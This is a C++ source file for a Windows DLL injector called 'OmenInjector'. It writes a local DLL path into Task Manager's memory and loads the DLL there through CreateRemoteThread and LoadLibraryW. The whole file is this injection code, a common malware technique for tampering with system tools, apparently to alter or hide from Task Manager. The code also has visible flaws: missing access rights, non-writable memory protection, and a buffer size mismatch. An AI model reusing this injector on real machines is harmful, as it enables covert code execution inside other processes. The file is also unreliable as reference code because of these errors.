// OmenInjector.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "windows.h"
#include <iostream>


int main()
{
	HWND window = FindWindow(NULL, L"Task Manager");
	DWORD pid;
	GetWindowThreadProcessId(window, &pid);
	std::cout << "PID of Task Manager: " << pid << std::endl;


	LPCWSTR dllName = L"Z:\\Repos\\Omen\\x64\\Debug\\OmenDll.dll";
	size_t namelen = wcslen(dllName) + 1;

	HANDLE taskManagerH = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, pid);
	LPVOID remoteString = VirtualAllocEx(taskManagerH, NULL,namelen, MEM_COMMIT, PAGE_EXECUTE);
	WriteProcessMemory(taskManagerH, remoteString, dllName, namelen*2, NULL);

	HMODULE k32 = GetModuleHandleA("kernel32.dll");
	LPVOID funcAddr = GetProcAddress(k32, "LoadLibraryW");

	HANDLE thread = CreateRemoteThread(taskManagerH, NULL, NULL, (LPTHREAD_START_ROUTINE)funcAddr, remoteString, NULL, NULL);
	if (thread == NULL) {

		LPWSTR messageBuffer = nullptr;
		FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPWSTR)&messageBuffer,
			0, NULL);
		wprintf(messageBuffer, dllName);
	}

	WaitForSingleObject(thread, INFINITE);
	DWORD exitCode = 0;
	GetExitCodeThread(thread, &exitCode);

	if (exitCode != 0) {
		std::cout << "[*] Dll injected!" << std::endl;
	}

	CloseHandle(thread);

	char input;
	std::cin >> input;
	return 1;
}

